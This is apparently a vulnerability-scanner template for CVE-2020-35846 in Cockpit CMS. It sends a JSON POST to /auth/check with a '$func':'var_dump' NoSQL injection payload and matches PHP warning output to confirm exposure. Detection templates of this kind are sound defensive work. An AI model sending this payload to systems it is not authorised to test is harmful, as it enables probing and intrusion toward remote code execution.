id: cve-2020-35846
info:
  name: Cockpit CMS RCE CVE-2020-35846
  risk: Potential
params:
- root: '{{.BaseURL}}'
references:
- link: https://swarm.ptsecurity.com/rce-cockpit-cms/
replicate:
  prefixes: cockpit
requests:
- body: '{"auth":{"user":{"$func":"var_dump"},"password":[0]}}

    '
  detections:
  - StatusCode() == 200 && StringSearch("body", "<b>Warning</b>") && StringSearch("body",
    "string(") && StringSearch("body", "bootstrap.php")
  headers:
  - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101
      Firefox/55.0
  - Content-Type: application/json
  method: POST
  redirect: false
  url: '{{.root}}/auth/check'
